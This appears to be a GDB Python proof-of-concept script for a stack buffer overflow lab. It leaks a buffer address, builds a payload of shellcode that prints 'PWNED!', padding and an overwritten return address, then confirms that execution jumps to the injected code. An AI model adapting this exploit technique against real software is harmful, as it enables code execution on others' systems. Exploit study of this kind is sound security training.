import gdb, struct

gdb.execute("set pagination off")
gdb.execute("set confirm off")
gdb.execute("break *0x401189")
gdb.execute("run", to_string=False)
buf_addr = int(gdb.parse_and_eval("$rax"))
print("PROOF buf_addr = %#x" % buf_addr)
gdb.execute("kill")

SC = bytes.fromhex("eb195e31ffffc731d2b207b8010000000f05b83c00000031ff0f05e8e2ffffff") + b"PWNED!\n"
OFFSET = 0x40 + 8
pad = b"A" * (OFFSET - len(SC))
payload = SC + pad + struct.pack("<Q", buf_addr)
open("/tmp/gdb_payload.bin", "wb").write(payload)

gdb.execute("delete 1")
gdb.execute("break *0x4011aa")   # juste avant 'leave' (fin de vuln)
gdb.execute("run < /tmp/gdb_payload.bin", to_string=False)

rbp = int(gdb.parse_and_eval("$rbp"))
inf = gdb.selected_inferior()
ret_val = struct.unpack("<Q", bytes(inf.read_memory(rbp + 8, 8)))[0]
print("PROOF saved_ret = %#x (== buf_addr ? %s)" % (ret_val, ret_val == buf_addr))

gdb.execute("stepi 2")  # leave ; ret
rip = int(gdb.parse_and_eval("$rip"))
print("PROOF rip_after_ret = %#x (== buf_addr ? %s)" % (rip, rip == buf_addr))
code = bytes(inf.read_memory(rip, 3))
print("PROOF bytes_at_rip = %s" % code.hex())
gdb.execute("kill")
